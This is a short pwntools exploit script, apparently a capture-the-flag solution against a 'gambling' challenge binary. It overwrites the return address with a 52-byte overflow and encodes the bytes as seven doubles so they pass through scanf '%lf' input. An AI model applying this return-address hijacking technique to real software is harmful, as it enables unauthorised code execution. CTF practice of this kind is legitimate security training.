#!/bin/python3
from pwn import *
import struct

# ─── helper to turn raw bytes → list of doubles ────────────────────────────────
def to_doubles(raw: bytes, count: int) -> list[float]:
    """
    Chop `raw` into `count` 8‐byte chunks (little-endian), pad with \x00,
    reinterpret each as a double, and return the Python floats.
    """
    raw = raw.ljust(count * 8, b'\x00')
    doubles = []
    for i in range(count):
        chunk = raw[i*8:(i+1)*8]
        # struct.unpack('d', chunk) treats those bits as an IEEE-754 double
        val, = struct.unpack('d', chunk)
        doubles.append(val)
    return doubles

# ─── after you find `offset` and choose your new EIP ← say `ret_addr` ─────────
offset    = 52              # example offset you discovered
ret_addr  = 0x080492c0      # the address you actually want in EIP
count     = 7               # scanf is reading 7 "%lf"

# build the raw payload: padding + new EIP
raw_payload = b'A' * offset + p32(ret_addr)

# convert into exactly 7 doubles
double_list = to_doubles(raw_payload, count)

# pack them into a single space‐separated string
scanf_input = ' '.join(str(d) for d in double_list)

p = process('./gambling')
#p = remote("challs.umdctf.io", 31005)
p.sendlineafter('Enter your lucky numbers:', scanf_input)
p.interactive()
